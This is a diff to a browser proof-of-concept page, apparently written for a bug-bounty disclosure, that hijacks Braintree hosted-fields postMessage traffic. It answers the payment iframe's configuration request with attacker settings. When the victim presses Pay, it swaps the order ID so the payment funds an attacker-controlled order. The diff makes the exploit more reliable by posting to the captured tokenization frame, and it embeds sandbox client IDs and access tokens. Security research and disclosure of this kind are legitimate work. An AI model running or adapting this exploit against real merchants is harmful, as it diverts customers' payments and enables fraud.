@@ -32,11 +32,11 @@ sandbox merchants and researcher owned sandbox orders. No third party is involve
 <div class="grid">
   <div>
     <label>Attacker sandbox client ID</label><input id="cid" autocomplete="off" value="BAAZJk4mOoefN6A2YKUmdHRRlhYabTO5vRj1Zo4V35GtvNmqPuVB1r4vF1meT2cov1ob6FKyg4pqpadkLc">
-    <label>Attacker sandbox access token</label><input id="tok" autocomplete="off" value="A21AAImifpPkO_cDNX6xAoeoFZrHiBsIDJWAuDOfHvNisc0BbT0Z5q2Sx3Q0IOh0mD_cgpmUzuk7r1RGJjRFibHOFNhZ5z75w">
+    <label>Attacker sandbox access token</label><input id="tok" autocomplete="off" value="A21AAKojvt-iLdtm2j6GE6huJz0su3MBtztxT80Gqew0H9P4vQ7v5N7j6JNw_pwIbuQxTAoZDtMbn6Oq-Uw-he0E-S4c16LBw">
   </div>
   <div>
-    <label>ATTACKER order ID (should end up funded)</label><input id="oid" autocomplete="off" value="54F15702TH9463308">
-    <label>MERCHANT order ID (should stay unpaid)</label><input id="moid" autocomplete="off" value="76J11993K1834422F">
+    <label>ATTACKER order ID (should end up funded)</label><input id="oid" autocomplete="off" value="56C28705TU241005V">
+    <label>MERCHANT order ID (should stay unpaid)</label><input id="moid" autocomplete="off" value="0MH064615J672573U">
   </div>
 </div>
 
@@ -75,6 +75,7 @@ const alog = (m) => { apiEl.textContent += m + '\n'; apiEl.scrollTop = apiEl.scr
 const $ = (id) => document.getElementById(id).value.trim();
 
 let channel = null;
+let tokFrame = null;   // the tokenization IFRAME, captured from its own CONFIGURATION_REQUEST
 
 function attackerConfig() {
   const t = $('tok') || 'ATTACKER_TOKEN';
@@ -98,6 +99,7 @@ window.addEventListener('message', (e) => {
 
   if (ev.endsWith(':bus:CONFIGURATION_REQUEST') && p.reply) {
     channel = ev.slice('braintree:'.length, -':bus:CONFIGURATION_REQUEST'.length);
+    tokFrame = e.source;          // this one really is the frame, unlike the merchant's emits
     log('<< ' + e.origin + '  CONFIGURATION_REQUEST  channel=' + channel);
     e.source.postMessage(PREFIX + JSON.stringify({ event: p.reply, origin:'', args:[attackerConfig()] }), '*');
     log('>> replied with the ATTACKER configuration');
@@ -106,7 +108,11 @@ window.addEventListener('message', (e) => {
   if (ev.endsWith(':hosted-fields:TOKENIZATION_REQUEST') && p.args && p.args[0]) {
     log('<< victim pressed Pay. options: ' + JSON.stringify(p.args[0]));
     const swapped = Object.assign({}, p.args[0], { orderId: $('oid') || 'ATTACKER-ORDER' });
-    e.source.postMessage(PREFIX + JSON.stringify({
+    // post to the FRAME, not to e.source: this event is emitted by the merchant page, so
+    // e.source is the merchant window and the frame would never see it
+    const target = tokFrame || e.source;
+    if (!tokFrame) log('!! no tokenization frame captured yet; falling back to e.source');
+    target.postMessage(PREFIX + JSON.stringify({
       event: 'braintree:' + channel + ':hosted-fields:TOKENIZATION_REQUEST',
       origin: '', reply: 'attacker-tokenization-reply', args: [swapped]
     }), '*');
